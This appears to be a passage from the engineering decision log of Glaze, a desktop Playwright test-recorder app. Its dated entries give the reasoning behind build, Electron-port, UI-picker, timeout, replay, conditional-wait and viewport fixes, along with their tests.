It caught its own author within a minute: adding `check:shell-drift` to `package.json` failed it, because that check must *not* be in the chain — it needs both branches fetched, which only CI reliably has. The fix was to name it in an `OUTSIDE_CHAIN` map with that reason, which is the behaviour wanted: "I meant to leave that one out" has to be written down rather than assumed.

### 2026-08-07 — The testing bottleneck was never the test suite

**Measured before changing anything.** The full local gate is ~36 seconds: lint 3.6s, type-check 4.0s, 28 checks 7.6s, 1105 Vitest tests 15.8s, build 4.9s. Making the suite faster would have bought nothing. (`CLAUDE.md` still said 1029 tests and 27 checks — stale, and worth correcting.)

**The real cost is that `npm run build` publishes to one global slot.** It ends with `Publishing staged build: .build -> ../.glaze/build` — outside the repo, one directory up, shared by `main`, every branch and every worktree. Only one branch can be "the app" at a time. The evidence was already in the history: `014c226` ("Build this branch: claude/browser-icon-display-bugs-987f45") and `ff2efa0` ("…Build the latest version of the app") exist to claim that slot. **Git history was being used as a build-slot mutex.** Two agents on two branches could not both have a testable app, and every other symptom — no preview environments, serialized review, a native rebuild per UI change — descends from it.

Two more, both confirmed rather than assumed: a fresh worktree has **no `node_modules`**, so the branches most likely to need the gate are the ones least able to run it; and CI runs only repo hygiene, because `@glaze/core` resolves into Glaze.app — so the merge gate was a checkbox on the honour system.

**The Electron port is the way out, and it is closer than it looks.** Comparing the two trees file by file: 206 shared paths, 101 byte-identical, 47 differing only by import specifier (`@glaze/core/backend`→`@shell/backend`, `@glaze/core/components`→`@ui`). **148 of 206 — 72% — are already identical or a one-line rename.** The port is mostly an import swap plus a `main/shell/` directory, which is what makes converging on one tree with two shell adapters a merge rather than a rewrite.

**It went in as a branch, not a directory.** The Electron tree existed only as untracked loose files on one machine — undiffable, unreviewable, one `rm -rf` from gone. As `shell/electron` branched from the port's real merge base, `git diff main..shell/electron` *is* the port and the missing features arrive by cherry-pick. As a subdirectory it would have been a second copy to hand-maintain, which is the problem rather than the fix.

Finding that base mattered more than expected. A first pass guessed `e6e59cc` from file timestamps and the DECISIONS entry; replaying every candidate and comparing all 199 shared source files put it at **`a61598c`** — 181/199 matching, against 160 at `e6e59cc` and 135 at `main`. Two hours of work off, and branching from the wrong base would have made the diff show the port plus everything in between. The drift is **12 commits**, not the 7 the file listing suggested: the two whose messages read as build publishes carry real source changes.

**A clean checkout did not produce a runnable app**, and all three causes would have hit CI on its first green-looking run. Electron 43 has no postinstall — the binary download moved to an `install-electron` bin, so `npm install` left no `dist/` and no `path.txt`. npm 12 blocks dependency install scripts by default, silently skipping esbuild and fsevents. And `build/` was not ignored: the port moved the output there but kept the Glaze-era ignore rules.

**The browser preview works because the renderer has exactly one funnel.** `renderer/lib/api.ts` → `window.glazeAPI.glaze.ipc.invoke(channel, …)`, plus a handful of direct clipboard/Menu/shell/nativeTheme uses — 15 files, 36 references. Standing in for that surface runs the entire UI in an ordinary browser tab, which is the fastest review loop available and the one an agent can drive with ordinary browser tooling.

A fake backend fails *silently* by construction, so it got three guards, each catching what the others cannot. Unhandled channels are recorded on `window.__preview.misses` rather than quietly resolved — this named all four of its own initial gaps within a minute of first load. A test reads the channel list straight out of `api.ts` and fails both directions (a handler naming a channel that does not exist; a must-handle channel with no handler). And the handlers are annotated with the app's own return types, because only the type-checker catches a fixture that answers the *right* channel with the *wrong shape* — three of the initial fixtures were wrong that way and each crashed the Stats view with no recorded miss.

Resolving an unknown channel to a shaped empty value rather than throwing is deliberate: a preview that white-screens on one unknown channel is useless exactly when you most want to look at it. The banner saying it is fixture data is not decoration — a fake that looks real invites bug reports against behaviour that was never wired up.

**Rejected: making the preview the only answer.** It is a UI preview with no backend, so it cannot catch a broken IPC handler, a window that fails to open, or a renderer blocked by CORS. That is why the Electron branch also drives the *real* app through Playwright's `_electron` support — already a dependency — with each test on a throwaway `--user-data-dir`. The flag rather than `app.setPath` because `main/index.ts` sweeps retention at module scope, before `whenReady`: anything redirecting the path from inside the app is already too late, and the default would run retention against the developer's own recorded tests.

**Worktrees get a symlinked `node_modules`, but only when the lockfiles match.** Sharing a tree across branches with different dependencies means an install on one silently rewrites the other's — a failure that surfaces days later as an inexplicable version error on a branch nobody touched. `scripts/bootstrap-worktree.mjs` refuses and says to install instead. (`.gitignore` already spelled `node_modules` without a trailing slash for this; the convention predates the script.)

**`sonner` was a genuinely missing dependency.** The SDK's `components.js` imports it, and it resolved from nowhere — so `npm run dev:renderer` returned 500 for the design system and the renderer never mounted. With it added, the Glaze renderer boots in a plain browser and reaches its error boundary on the absent preload, which is the expected failure and no longer a module-resolution one.

### 2026-08-07 — Two bugs in the browser picker: a doubled glyph, and a leaked one

**Reported as one thing, and it was two.** The picker showed two browser icons side by side, and the sidebar row for the open test showed Chromium while the picker beside it said Firefox.

**The doubled glyph: `SelectValue` already draws the item's icon.** Giving each `SelectItem` an SF Symbol so the AppKit menu could show glyphs also gave the *trigger* one — `SelectValue` renders `selectedItem.icon` before the label. The lucide `BrowserIcon` added alongside it was therefore the second icon, in all three pickers (test detail, batch, settings). Removed there; `BrowserIcon` stays for the DOM-only surfaces (Stats table, Stats tag badge). The icon that survives is the SF Symbol, which is the one the dropdown's own rows use — so the trigger and the open menu now agree, which they did not before.

The test that was supposed to catch this asserted the trigger carried `data-browser="firefox"` and no `data-browser="chromium"`. Both were true with the bug present: it pinned that OUR icon was right and never that it was the only one. The replacements assert the count instead — zero `[data-browser]` nodes on the trigger, engine named once — because "an icon is correct" and "one icon" are different claims and only the second was ever in question.

**The leaked glyph: the sidebar was right and the picker was wrong.** `TestDetailView` is a route component, and the router does not remount one when only its params change (no `remountDeps` on the route). Clicking another test in the sidebar re-renders the *same instance* with a new id — so the six `xInited` booleans that seeded the run controls "once" fired for the first test opened and never again. Every test after it displayed the previous test's engine, timeout, and toggles, and Run test used what was displayed. The sidebar row, reading `runBrowser` straight off the record, was the honest surface.

Fixed by tracking WHICH test the controls hold (`seededFor`), not WHETHER they were seeded. All six moved into one effect rather than six id-scoped copies of the same latch: they depend on the same two queries and drifting apart is how one of them ends up with a subtly different rule. Re-seeding is still keyed on the test id and not on the record changing, so a refetch after the user picks an engine cannot undo the pick.

**Same effect, second latent bug: the settings race.** Seeding ran as soon as the record arrived, whether or not `["recorder-settings"]` had. For a test that has pinned nothing, losing that race latched the hard-coded `chromium`/`false` fall-backs instead of the user's configured defaults — a coin flip per mount, invisible to anyone whose default is Chromium. The effect now waits for that query to settle.

**Why the picker's persist call now invalidates two keys.** `tests:setBrowser` wrote to disk and nothing re-read it. The sidebar's glyph comes from the `["tests"]` list, so the row kept the old engine until something unrelated refetched — the same visible symptom as the leak, from the opposite direction. `persistRunBrowser` invalidates `["tests"]` and `["test", id]`, and only on a successful write: a failed save changed nothing, and re-reading would only re-assert what is already on screen.

It is exported, and tested directly, because the SDK `Select` is native-menu-backed — its options never enter the DOM, so there is no way to drive a selection in jsdom and no way to reach this through the trigger. The navigation leak, by contrast, *is* reachable: `renderView().renavigate(id)` re-renders the same instance under a new route param, which is exactly what the router does. It fails with "expected Chromium, received Firefox" against the old latch.

**And then the sidebar accessory came out entirely.** The entry below shipped it conditionally — only for a test that had PINNED an engine — as a narrowing of "put the engine on every row", which was already the weak surface when the feature was scoped. Removed on the same day it was reported: the pinned-only rule made it a glyph that appears on a minority of rows for a reason the row itself can't explain, and the question it answers ("what will this run on?") is one you ask in the toolbar, immediately before running, where the picker already answers it. `BrowserIcon` is now a Stats-only component.

`persistRunBrowser` keeps invalidating `["tests"]` even though no row draws that field any more: the list holds its own copy of every record, and a cache that disagrees with disk about a field is a trap for whatever reads it next, not just for what read it last.

### 2026-08-07 — "Crawl" test speed: a step delay plus a real page settle

- **Goal:** A fourth speed, slower than Slow, that waits for the page to finish loading before handing control back to the test runner — a steadier, more deterministic run, and the foundation for page indexing during runs later.
- **Key decisions:**
  - **A run-time fixture, not generated code.** The obvious implementation is emitting `await page.waitForLoadState(...)` between steps in `script-generator.ts`. It is wrong here: a spec is generated ONCE and then lives on disk, while speed is changed afterwards from the sidebar slider with no regeneration. The file and the setting would silently disagree the moment anyone moved that slider, and the file is what runs. So settling lives in `glaze-settle.mjs`, written next to the specs and reached through the same import redirect capture and Auto-Heal use.
  - **Its own module, not more code in the capture fixture.** Page indexing wants exactly this hook — post-settle is the one moment the DOM is known stable. `onSettled(fn)` is that seam. Folding settling into `capture-fixture-source.ts` would have made indexing a later untangling instead of a later addition.
  - **Install order is the contract.** `installSettle` runs after `installHealing` and before capture's `patchOnce`, because each patch wraps the previous one. That produces the unwind `action → heal retry → settle → screenshot`. Installed the other way round, every screenshot on a crawl run is of a page that hasn't finished loading — a worse artifact and a source of visual-diff noise. Pinned by `check:crawl-speed`, which asserts the two call sites' order.
  - **The timeout floor is not a nicety.** Crawl waits after every action on top of a 2.5s step delay; a 20-step test that took 40s on Slow can run for minutes. Against the 60s default timeout, *choosing the speed built for resilience would make tests fail* — the exact opposite of the feature. So a crawl run's timeout is floored at 5 minutes. It is a floor, not an override (a longer configured timeout is untouched), and the runner prints the raised value: a timeout that silently changed itself is worse than a slow run, because the user set 30 seconds, watched four minutes go by, and had nothing to read that explained it.
  - **One list of speeds.** `TestSpeed` was re-declared as a literal array in four renderer components plus two backend validators. Adding a fifth speed to five of six places is invisible — the picker renders, the other speeds work, the new one just isn't there. `TEST_SPEEDS`/`TEST_SPEED_LABELS`/`isTestSpeed` are now the single source, following the existing `RUN_BROWSERS` precedent, and `check:crawl-speed` holds the renderer's mirror to main's.
  - **Settling does not make a run an artifact run.** Adding `settling` to the spec-redirect gate would have extended `capturingRun = true` to it, so a user with auto-heal off and a test on Crawl would prune their artifact history and create an empty run dir on every run. The bookkeeping is gated on `artifactRun` separately.
  - **`RunRecord.speed` is left undefined when unknown**, unlike `runBrowser` which defaults to chromium. Every pre-picker run really did use chromium; a run recorded before this field could have been at any speed, and writing "fast" would invent evidence for the one comparison the field exists to support — whether the slower speed actually passes more often.
- **Rejected:** emitting waits into the spec (above); making Crawl imply screenshot capture (capture has a real cost and nobody should pay for one feature by asking for another — the same reasoning that keeps a11y, logs and healing separately gated); `networkidle` without a cap (a page with a websocket, a long-poll or an analytics beacon never goes idle, so the cap is the normal outcome there, not the exception).
- **Corrections/Lessons Learned:**
  - The paint-wait fallback timer was written with `.unref()`, reasoning that a wait nobody is reading shouldn't hold the process open. That is backwards: an unref'd timer doesn't keep the event loop alive, so when it is the ONLY pending work — a page whose rAF never fires, nothing else in flight — the process exits instead of the fallback firing. Found because the check script's own boundedness test silently stopped mid-run rather than failing, which is exactly the symptom.
  - The MCP server keeps a **third** copy of the speed→delay table (`mcp/server.mjs`), missed on the first pass because it is `.mjs` and the search was scoped to `.ts`. A speed missing there reads as `undefined` and the `?? 0` turns it into a full-speed run of a test the user deliberately slowed down, reported as a normal pass or fail. Now pinned against `run-pacing.ts` by `check:crawl-speed`. MCP-driven runs get the pacing but not the settling — like capture, a11y and healing, settling needs the import redirect that server doesn't do.
  - The ordering assertion initially passed against `function patchOnce(page)`'s *definition* rather than its call site, which would have made it vacuous. Caught by mutating the source and finding the "failure" didn't reproduce.

### 2026-08-07 — Browser engines get an icon

**The gap.** The run engine was a word in six places and a picture in none. "Chromium" / "Firefox" / "WebKit" all read as the same grey text at a glance, so the one question a browser picker exists to answer — *which one am I on?* — took reading rather than looking. In the Stats run history it was worse: the engine name sat inside the Tags badge next to the headed/headless icon, so one badge carried two unrelated facts and neither was scannable down a column.

**Chosen: lucide `Chrome` / `Flame` / `Compass`, not brand logos.** These are already a dependency and already the app's visual language — every other icon in the UI is a 12–16px monochrome stroke. A real Chrome/Firefox/Safari mark is filled and multicolour, and at 12px inside a table cell it reads as a smudge rather than a logo. The compass is also the *more* correct choice for WebKit: WebKit is Safari's engine, not Safari, and stamping the Safari logo on it would assert something false.

**Two glyph maps, because there are two renderers.** The SDK's `Select` is native-menu-backed — its options are drawn by AppKit and never enter the DOM, so a React icon passed to a `SelectItem` is silently dropped. `SelectItem` does take `icon?: NativeMenuIcon`, so the dropdown gets SF Symbols (`globe`/`flame`/`safari`) while the trigger, which *is* real DOM, gets the lucide glyph. `browser-icons.tsx` holds both maps so the two surfaces can't drift into disagreeing about which glyph means Firefox.

**Rejected — `imagePath` on the native menu items.** `NativeMenuIcon` also accepts a path to an image file, which would have put the identical lucide glyph in both the trigger and the dropdown. It needs an absolute on-disk path that the native host can read, and the renderer's assets are Vite-bundled — wiring a resolved path through the main process for three static icons buys pixel-identical menus at the cost of a build-output dependency in the UI layer. SF Symbols are close enough and cost nothing.

**The Stats Tags badge lost its engine name.** Once Browser is its own column, `🌐 Chromium` in Tags is the same fact twice. The badge now shows the mode icon plus the engine's glyph and no words — it keeps the glyph rather than dropping the engine entirely because the tag filter still offers Chromium/Firefox/WebKit as options, and a filter whose selection nothing in the row reflects is a dead control. The mode icons gained explicit "Headed"/"Headless" labels in the same edit: they had been relying on the adjacent engine name to be decodable at all, and removing that would have left two anonymous glyphs.

**The sidebar accessory is deliberately conditional.** It renders only when a test has *pinned* an engine (`TestRecord.runBrowser` set). Showing every test's effective engine would put the same default glyph on nearly every row — noise that trains the eye to skip it, which then hides the rows that do differ. This was flagged as the weak surface when the change was scoped and included with that narrowing.

**Testing note.** Unlabelled icons carry `data-browser`, because a `Select` trigger showing the *wrong* glyph is silent — the label beside it still reads correctly — and without an accessible name there is nothing else in jsdom to match on. `browser-icons.test.tsx` pins that both maps are total over `RUN_BROWSERS` and that no two engines share a glyph; a missing entry would render `undefined` as a component and throw at runtime in whichever view happened to show that engine first. All three mutations (duplicate glyph, column moved to the end, icon removed from a trigger) were reverted and confirmed to fail their own test and no others.

**Environment note, cost real time.** Running `vitest` from a git worktree that has no `node_modules` symlink *creates a real `node_modules/` directory there* to hold its Vite cache. That empty directory then shadows the main checkout's install for every subsequent lookup, and both `type-check` and `vitest` fail with resolution errors ("Failed to resolve import react/jsx-dev-runtime", 181 phantom type errors) that look like the change under test broke something. `.gitignore` already documents that a worktree's `node_modules` should be a **symlink** to the main checkout's install — create it before the first command, not after.

### 2026-08-07 — Per-generation model picker, and LM Studio's loaded models

**The gap.** "Generate test from prompt" ran on whatever model Settings pointed at, with no way to say otherwise. Writing a whole spec is the single place where model choice matters most — a flow that a 7B model mangles is often one shot for a 27B — and the only way to switch was to leave the dialog, change the app-wide default, and come back.

**Chosen: the picker is a per-generation override, not a settings edit.** It seeds from `llm:getConfig` and is passed explicitly on `llm:chat`; nothing is written back. Persisting the choice would silently retarget the AI debug panel and step generation too, so "use the big model for this one test" would quietly become "use the big model for everything", and the user would find out from a token bill or a slowdown somewhere unrelated.

The dialog also drops a stale configured model rather than sending it. A model deleted or renamed in the provider since it was chosen used to fail mid-generation with a provider error naming a model the user no longer recognized; the dialog now falls back to a model that exists, preferring one already in memory.

**Chosen: read LM Studio's load state from its own API, as optional enrichment.** `/v1/models` reports every downloaded model identically, so the picker couldn't distinguish the model that answers now from the one that spends a minute loading first. That distinction is not cosmetic: a cold model on LM Studio streams nothing at all while it loads, which in this dialog is indistinguishable from a hang, and the user's reasonable response is to hit Stop on a request that was working.

LM Studio's own REST API (`/api/v0/models`, 0.3.6+) carries a per-model `state`. It is fetched as a **second, failure-tolerant call** rather than as a replacement for `/v1/models`, which stays the source of truth for which models exist and whether the provider is reachable — `/v1` is what chat actually posts to. An older LM Studio (404s `/api/v0`), or some other OpenAI-compatible server on port 1234, therefore costs a missing badge and never an empty model list or a false "not connected".

**`loaded` is three-state, and that is load-bearing.** `true`, `false`, and `undefined` = "the provider never said". Ollama and Claude are permanently the third case. Collapsing `undefined` into `false` would tell every Ollama user their models are cold — wrong, and not fixable from the UI, since there is no such thing to fix. The same rule covers a `state` string we don't recognize (a future LM Studio growing e.g. `loading`): unknown stays unknown rather than being guessed into "not loaded". Pinned in `llm-service.test.ts` and `generate-test-dialog.test.tsx`.

**Rejected — `CustomSelect` with colour dots.** The SDK's guidance points at `CustomSelect` when items need custom colours, and it would have rendered the state in the DOM. But the rest of this dialog uses the native `Select`, and the native menu already expresses the distinction better than a dot: `SelectGroup` headers ("Loaded" / "Not loaded" / "Load state unknown") sort the list by the thing being asked about, and per-item `sublabel`s explain the consequence in words instead of colour. A `Badge` next to the trigger carries the selected model's state in the DOM, so the state is visible without opening the menu — and assertable in jsdom, where a native menu's options never exist.

**Scope.** Settings still shows a flat model list. It resolves the same enriched `LlmProviderStatus`, so surfacing load state there is a rendering change only, but nothing in Settings stalls on a cold model the way a generation does.

### 2026-08-06 — Configurable Playwright test timeout (default 1 minute)

**The bug.** Every run used Playwright's built-in 30s per-test timeout because `ensureConfig` wrote a config with only `slowMo` and never a `timeout`. Multi-step tests failed constantly once they crossed 30s. There was no Settings control and no per-test override.

**Chosen: global default + optional per-test override, applied at run time.**
- Settings stores `defaultTestTimeoutMs` (default 60_000, clamp 5s–30min).
- Each test may store `testTimeoutMs`; absent means "use Settings".
- The runner resolves override → default → 60s, then passes both `--timeout=` (authoritative CLI flag) and `PW_TEST_TIMEOUT_MS` (so the generated config matches if someone runs it outside the app).
- The process hard-kill (`RUN_TIMEOUT_MS`, floor 5 min) is raised to `max(5min, testTimeout + 60s)` so a long legitimate timeout isn't murdered by the process watchdog first.
- `ensureConfig` is always rewritten (like the step reporter) so existing scripts dirs pick up the timeout field without a manual delete.

**Rejected — only bumping a hardcoded constant.** That would fix the immediate failures but leave long flows stuck again at whatever new constant we picked. The Settings + per-test shape matches headless/browser already.

**Rejected — only writing timeout into `playwright.config.ts`.** Config is shared across the scripts dir; a per-test override needs a per-run value. CLI `--timeout` wins over config and is the right lever.

**UI is seconds, storage is ms.** Matches how users think about the knob; matches Auto-Heal timeout's ms-at-the-boundary convention on the wire.

### 2026-08-06 — A replay must not record itself

**The bug.** A replayed step is a real interaction in a live recording session: the injected replayer clicks a real element, and the capture script is listening on that same element. The four replay paths did each pause capture — but each did it by hand, and the copies had drifted. What none of them did was tell the *rest of the app*, which is where the visible damage was.

**Three failures, all silent.**
- **The other trainer window stays live.** The main window and the docked panel render one session, but `executing` and `replayRun` are set only in the window that called the store. A replay started in the panel left the main window on "Recording" with every tool enabled — and an Add step pressed there lands mid-replay, in a session whose entire premise at that moment is that capture is off. Fixed by adding `replaying` to the broadcast `RecorderState`; both views fold it into their existing `running` gate.
- **Focus was never moved.** The replayer dispatches synthetic events, so clicks worked and nobody noticed — but a `press` step targets whatever the OS considers focused. Replaying a keystroke from the docked panel typed into the panel.
- **Nothing said whether the step passed.** The row got a check or an X in a status column that persists until the next run. For the very common "replay one step, watch the browser, look back" loop, there was no answer to "did *that* one just work".

**Chosen: one `withCaptureSuspended` helper, and every replay path goes through it.** Suspend → push the attribute → broadcast → focus the training window → settle → run → restore in a `finally`. The ordering is the whole content of the helper: `session.paused` alone changes nothing (the capture script gates on the `data-pw-paused` DOM attribute), and focus and settle are worthless after the body has run. It restores the *prior* pause state rather than false, so replaying while the user had deliberately paused does not resume recording behind their back.

`check:replay-suspend` pins the shape at source level, because the real failure mode is a NEW path — someone adds `replayRange` next to the four, writes it the obvious way, and it records everything it replays. It also asserts no replay method touches `session.paused` directly, which is what let three of the four hand-rolled copies drift in the first place.

**Rejected — per-window React state for "a replay is running".** It is what was already there, and it is precisely why one window could act into the other's replay. The backend owns step ordering for the same reason; this belongs beside it.

**Rejected — moving focus back to the trainer when the run ends.** Recording resumes with the browser focused, which is where the next interaction goes. A second focus hop would put the user one click away from the thing they were about to do.

**The pass/fail flash is an outline, not a border, and only `outline-color` animates.** Both constraints are inherited wholesale from the `.step-new` highlight (2026-08-06, "Glow the steps an AI change added"): a border shifts the row 2px and collides with the drag-over border utility, and animating `box-shadow` silently erases the `ring-*` selection and run-status highlights, which are box-shadows too. The flash is a third highlight on the same row and had no business rediscovering either.

It is **ephemeral where `.step-new` is not** — 2.5s, matching the per-row replay tint already in `step-row.tsx` so the outline and the background clear together. That makes it a one-shot fade rather than a pulse: a pulse that lives 2.5s reads as a flicker. Because `.step-new` also draws an outline, the two cannot compose the way the outline/box-shadow pair does — `step-row.tsx` gives precedence to the flash and lets the glow return underneath when it expires, rather than letting stylesheet order decide.

**The flash is keyed off the step's END event, not the replay's start.** A conditional wait runs up to its (preview-capped, 5s) timeout, so a flash timed from the start would already be gone by the time the step it describes finished. Each entry owns a cancellable timer, because replaying one step twice in quick succession otherwise has the first run's timer clear the second run's flash about a second early — which reads as the highlight being unreliable rather than as a bug.

**One thing found in passing.** The `resized` listener added the same day logs manual window drags, and a replayed `viewport` step resizes that window through the same host API — so macOS fired it and the log gained a line claiming a manual resize that never happened, in the log that exists *because* manual resizes leave no other trace. Now gated on `replaying`.

### 2026-08-06 — Conditional waits ("Wait until"), and the comment that makes them survive a round trip

**Goal:** the trainer could only wait for a fixed duration or for an element to appear. Add a third form — wait until a measurable condition holds, with the same vocabulary as assertions — and let the user pick more than one wait property at a time.

**The load-bearing problem is not the feature, it's the round trip.** Playwright has a native waiting API for exactly three of the twelve predicates: `locator.waitFor({ state: "visible" | "hidden" | "attached" })`. For everything else — enabled, checked, contains-text, has-value, count, URL, title — the only auto-retrying primitive *is* `expect`. So "wait until the button is enabled" and "assert the button is enabled" compile to the identical call. That matters because `tests:updateScript` re-parses the whole spec back into steps on every hand edit and every applied AI fix: without something to tell the two apart, every conditional wait silently returns as an **assertion**. The step's type changes under the user, the Steps tab now describes something different from what they built, and nothing throws.

**Chosen: a trailing `// wait until` marker, and `stripComments` preserves it.** The generator appends it to the `expect`-based waits only; the parser reads it off the statement's line and routes those to `wait` steps. Three things make this cheap rather than clever: the parser already had exactly this exception for `// disabled — skipped:`, so the mechanism is not new; a hand-written `expect` carries no marker and correctly stays an assertion; and the marker is inert to Playwright. `spec-parser.check.ts` pins both directions, because a marker the generator emits and the parser doesn't read is worse than no marker at all.

**Rejected — plain `expect`, no marker.** Simplest generated code, and the failure mode is entirely silent: waits decay into assertions one script-edit at a time. **Rejected — restricting the feature to the three native predicates.** Perfect fidelity, no marker, but it drops enabled/checked/text/count, which are most of the reason to want a conditional wait.

**Two bugs found while writing the parser side, both silent and both inverted.**
- `.waitFor({ state: "hidden" })` parsed as a *bare* wait — the state was dropped — and a bare wait regenerates as `.waitFor()`, which waits for **visible**. Round-tripping a hidden wait through a script edit produced its exact opposite.
- The browser's right-click **"For element hidden"** had the same inversion at the other end: `waitMode: "hidden"` was mapped into the dialog's element mode, which emits the same visible-wait. The menu said hidden, the test waited for visible, and nothing on screen disagreed. Both are now `waitUntil: "hidden"`, and `state: "detached"` — which the step model has no counterpart for — is reported as *unclassified* (surfacing as `stepsDiverged`) rather than being flattened into a wait that means something else.

**The marker check had to be anchored on the statement, not on the scan cursor.** First implementation read the "current line" from the parser's position `i`, which is wherever the *previous* statement stopped — usually before the newline that precedes this one. It found the end of the previous line every time, so `isWait` was always false. Every marker-based case failed on the first run of the new check; that is the whole argument for writing the round-trip assertions before believing the feature works.

**Multiple waits are separate steps, not one compound step.** The dialog's three properties became checkboxes and one submit emits one `wait` step per ticked box — element, then condition, then duration. `onAdd` already took a `RawStep[]` (the `if`/`endif` pair uses it), so this cost nothing in the data model. A single compound wait step would have needed new generator, parser and replayer branches, plus an internal ordering the UI has no way to show, and it would have made the trainer's per-step reorder/edit/delete meaningless for waits. Order is fixed and tested: the duration is a settle pad, and a pad emitted before the thing it pads is just a delay. A ticked box with no element picked refuses the **entire** submit — emitting the other two and dropping that one delivers something quietly different from what was asked for.

**"An element" was kept even though "Wait until → element is visible" subsumes it.** It is the shortest path for the common case, it is what the right-click menu targets, and removing it would have migrated every wait step already recorded for no user-visible gain.

**Timeouts fail the step, and `timeoutMs` is treated as an injection sink.** Default 10s (longer than Playwright's 5s `expect` default — someone reaching for an explicit wait is usually waiting on something slower than the default already covers), emitted as `{ timeout: N }`. A user who wants a non-fatal wait ticks the existing per-step "Continue on failure" rather than getting a second, overlapping control. `timeoutMs` is concatenated into source as a bare numeral — the same sink shape that made `count` an RCE — so it goes through `int()` at the boundary *and* `num()` in the generator. Both halves are pinned separately in `check:step-ingest`, because `recorder:updateStep` copies its allowlisted fields without re-normalizing, which leaves the generator as the only guard on that path.

**The replay preview polls, and caps at 5s.** `runWaitUntil` re-checks every 100ms and returns a Promise. The cap is deliberate and matches the one the fixed-duration wait has always had: the trainer's UI awaits this call, so honouring a legitimate 60s timeout in the preview would be indistinguishable from a frozen app. The log line says when it capped, so a preview timeout is not mistaken for a real one.

**Coverage:** `check:step-ingest` (forged `timeoutMs` and unknown `waitUntil`, at the boundary and at the generator; plus that widening the wait vocabulary did not widen what an `if` condition accepts), `check:spec-parser` sections 10–12 (every predicate round-trips **byte-identically**, an unmarked `expect` stays an assertion, `.waitFor({state})` keeps its state, a disabled conditional wait keeps its predicate through the comment-inside-a-comment case), a new `add-step-dialog.test.tsx` (emission count and order, refusal on a targetless box, the right-click hidden fix), `step-replayer.dom.test.ts` (passes on a later poll, times out with a diagnosable message, honours the cap), plus the `describeStep` parity and `stepSignature` cases. Every one was verified to fail with its fix reverted — including a deliberate re-order of the emitted steps, which is the property a reader is most likely to assume is untested.

### 2026-08-06 — A window resize is a real step: the trainer resizes, and every resize logs its dimensions

**The step type already existed; it just didn't do anything outside a run.** `viewport` steps have been generated, parsed and replayed-at-run-time since window-size presets landed. Three things were missing, and each was silent.

**1. Trainer replay answered a resize with "applied at run time; not previewable" and returned `ok: true`.** That is the wrong shape of wrong. The step didn't merely go unpreviewed — every step AFTER it then ran at whatever size the window happened to be. A mobile-only menu button wouldn't resolve, and the failure pointed at the click rather than at the resize that never happened. `resize-service.ts` now resizes the native window, dispatched from `runStep` alongside `cookie` steps.

**Why a separate service rather than the injected replayer.** A page cannot resize the window it is loaded in: `window.resizeTo` is a no-op for a window the script didn't open. The size lives on the native window, exactly like an httpOnly cookie lives on the session — so it takes the same shape as `applyCookieStep`, returns the same `{ok,error?,logs}`, and is dispatched from the same single place. Routing both through `runStep` is what stops a step kind being handled in one replay path and missed in three.

**Content size, not window size.** The recorded number is the PAGE size — a spec calls `page.setViewportSize` with it, and the trainer window is created with `useContentSize` when a preset applies. Sizing the frame would preview a viewport short by the title bar's height, which is enough to sit on the wrong side of a breakpoint.

**2. A resize was invisible in the run output.** It is the only recorded action with no target to name: every other step logs "click getByRole(...)", and a resize logged nothing at all. A run failing at a responsive breakpoint gave no evidence the page had been resized, or to what. The generated spec now emits a `console.log` after `setViewportSize`, and the trainer streams the same information into the Console tab.

**Three sizes, not one, because they disagree and each disagreement means something.** *Requested* is what the step asked for. *Window* is what the OS granted — it clamps a window larger than the display, so a 1440-wide step on a 1280-wide laptop records one size and replays at another; unlogged, that reads as a flaky test. *Page* is what the document sees, which differs by the scrollbar's width — and the page number is the one that flips a CSS breakpoint. Logging only the requested size would assert the very thing that may not have happened.

**Why a bare `console.log` in the spec and not a runtime helper.** Three constraints, and the helper fails two of them. `buildStepLineMap` (the fallback for hand-edited specs) classifies steps by counting leading-`await` lines, so an awaited log line shifts every later step's highlight by one. And `StepReporter` drops any `pw:api` step whose `location.file` isn't the spec, so routing the resize through an imported helper — the `glazeCapture` pattern — would silently cost every viewport step its run highlight. What makes the bare log possible is that `page.viewportSize()` is SYNCHRONOUS: the applied size can be read with no `await` and no Playwright step. The rejected alternative, echoing the requested numbers, would have been trivially awaitable and worthless.

**The parser had to learn that a log line is not a step.** An unclassifiable statement increments `skipped`, which sets `TestRecord.stepsDiverged` — a permanent "your steps undercount the script" warning on every test that resizes. `console.*` calls are now consumed without counting, the same treatment the `const V = {…}` header gets. A disabled resize needed a second fix: it is commented out as TWO lines, and only the first carries a step, so "zero steps AND zero skips" had to stop meaning "unclassifiable".

**3. The two "+ Add step" dialogs each carried their own copy of the preset list**, and custom dimensions went in as `Number(vw) || 1280` — a typed `50` became a 50-pixel step that the backend then clamped to 200 without saying so. Both now use `RESIZE_PRESETS` and `clampViewportAxis` from the one shared module, and a resize row is inline-editable as a single `WIDTHxHEIGHT` field. An unparseable draft commits **nothing**: a resize with only a width isn't a smaller edit, it's a step that generates a spec Playwright rejects.

**Manual window drags are logged too** (`resized`, the end-of-gesture event, not `resize`, which fires per frame). The training window's page area is what every subsequent step is captured against, and dragging its edge otherwise leaves no trace anywhere — "this test only fails on one machine" is usually that.

### 2026-08-06 — Invented Tailwind token names replaced with real design-system ones

**Symptom:** 27 class names across seven renderer views (`border-token-border`, `bg-token-surface-raised`, `bg-token-surface`, `bg-token-hover`, `ring-token-border`) were never defined by the Glaze design system. Tailwind emits nothing for an unknown utility, so they had been styling nothing — cards with no fill, list rows with no hover, a screenshot with no outline. Nothing catches this: it is not a type error, not a lint error, and the views render perfectly well without the rule.

**It is only visible in the build output.** The check that matters is grepping the emitted `build/assets/styles-*.css` for the rule, not reading the source — a plausible-looking class name and a real one are indistinguishable in a `.tsx`. Baseline: zero `.border-token-border` / `.bg-token-surface*` / `.bg-token-hover` rules, while every real utility used on the same lines (`border-accent`, `text-tertiary`, `bg-control-subtle`) was present. The same grep after the fix is what confirms it.

**`border-separator`, not `border-secondary`.** Both resolve to `var(--fg-10)`, so the choice is about consistency, not colour: the repo already used `border-separator` 62 times and `border-secondary` zero, for card outlines *and* row dividers alike (`generate-test-dialog.tsx`, `a11y-panel.tsx`, `variables-panel.tsx`). Splitting the two by role here would have introduced a distinction the rest of the codebase does not make.

